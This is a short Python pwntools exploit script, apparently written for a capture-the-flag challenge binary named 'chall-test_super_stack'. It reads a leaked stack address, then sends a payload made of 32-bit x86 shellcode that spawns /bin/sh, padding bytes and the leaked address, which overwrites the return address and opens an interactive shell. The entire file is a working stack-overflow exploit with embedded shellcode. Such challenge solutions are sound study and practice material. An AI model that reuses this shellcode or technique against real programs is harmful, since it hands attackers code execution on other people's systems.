from pwn import *

import time

target = process("./chall-test_super_stack")
gdb.attach(target)

target.recvuntil("buf: ")
leak = int(target.recvline().strip("\n"), 16)
print "target address is: " + hex(leak)

leak = leak - 0
payload = ""
payload += "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"
payload += "00000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(leak)
target.sendline(payload)

target.interactive()
